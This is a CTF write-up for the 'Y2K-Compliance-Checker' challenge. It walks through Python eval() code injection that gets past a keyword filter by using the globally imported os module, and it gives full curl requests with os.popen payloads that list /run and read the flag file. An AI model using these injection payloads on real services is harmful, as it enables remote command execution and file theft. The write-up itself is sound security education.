# Y2K Compliance Checker - CTF Writeup

## Challenge Description
**Name:** Y2K-Compliance-Checker
**Points:** 487
**Difficulty:** easy
**Target:** `y2k-compliance-checker.hackday.fr:8000`

Millennium Systems has deployed a Y2K Compliance Checker tool to verify that dates will work correctly after the year 2000. The tool accepts date expressions and evaluates whether they are Y2K-safe. The flag is on the server, and no brute-force is needed.

## Reconnaissance
Opening the target URL in a web browser (or via `curl`) reveals a simple web interface allowing users to enter a date expression (e.g., `1999 + 1`). 

Analyzing the page's HTML source code yielded an important finding—a developer comment left by mistake:
```html
<!-- Dev note: parser uses eval() for arithmetic. Security review: 2000-Q1 -- Dont touch D /run >
```

This comment gave us two critical pieces of information:
1. The application evaluates user input using Python's dangerous `eval()` function, presenting an obvious path for Server-Side Template Injection (SSTI) / Server-Side Code Injection.
2. The flag or sensitive data is likely located within the `/run` directory (`Dont touch D /run`).

## Exploitation

### 1. Fuzzing the `eval()` Endpoint
The form submits data via a POST request to `/check` with the parameter `date_expr`. Since the application mentions it uses `eval()`, I tried out basic injection payloads like `__import__('os').popen('ls').read()`. 

However, the application responded with:
```html
<div class="result"><pre>BLOCKED: Suspicious input</pre></div>
```
The application implemented a basic Web Application Firewall (WAF) or string filter, blocking common injection keywords such as `__import__`, `exec`, `__class__`, and `__subclasses__`.

### 2. Bypassing the Filter
To see what was accessible within the `eval()` execution context, I fuzzed the endpoint with various Python built-in words and functions.
Interestingly, passing just the word `os` returned:
```
Result: <module 'os' (frozen)>
```
This proved that the `os` module was already imported globally by the Python script (e.g., app.py), and the filter did not block the string `"os"`.

### 3. Enumerating the System
Knowing `os` was directly accessible, I chained it with `.popen()` to achieve Remote Code Execution (RCE). 
I sent the following payload to list the `/run` directory as hinted in the source code:
```python
os.popen('ls -la /run').read()
```
**Request:**
```bash
curl -X POST -d "date_expr=os.popen('ls -la /run').read()" http://y2k-compliance-checker.hackday.fr:8000/check
```

**Response:**
```text
Result: total 16
drwxr-xr-x    1 root     root          4096 Mar 27 17:21 .
drwxr-xr-x    1 root     root          4096 Mar 27 17:21 ..
-rw-rw-rw-    1 ctfuser  ctfuser         73 Mar 27 07:35 flag.txt
drwxr-xr-x    2 root     root          4096 Jan 27 21:19 lock
```

### 4. Retrieving the Flag
With the exact path to the flag confirmed (`/run/flag.txt`), the final payload was straightforward:
```python
os.popen('cat /run/flag.txt').read()
```

**Final Payload Request:**
```bash
curl -X POST -d "date_expr=os.popen('cat /run/flag.txt').read()" http://y2k-compliance-checker.hackday.fr:8000/check
```

**Output:**
```
Result: HACKDAY{efd31bf5171485982d51cc1639b4e2c3f001aa7fc317c6cbd7d10f08fe43b14b}
```

## Conclusion
The vulnerability stemmed from using the dangerous `eval()` function to calculate arithmetic expressions combined with a weak blocklist filter. By discovering that the `os` module was already imported and accessible in the global scope, we bypassed the keyword restrictions and executed system-level commands to read the target file.

**Flag:** `HACKDAY{efd31bf5171485982d51cc1639b4e2c3f001aa7fc317c6cbd7d10f08fe43b14b}`
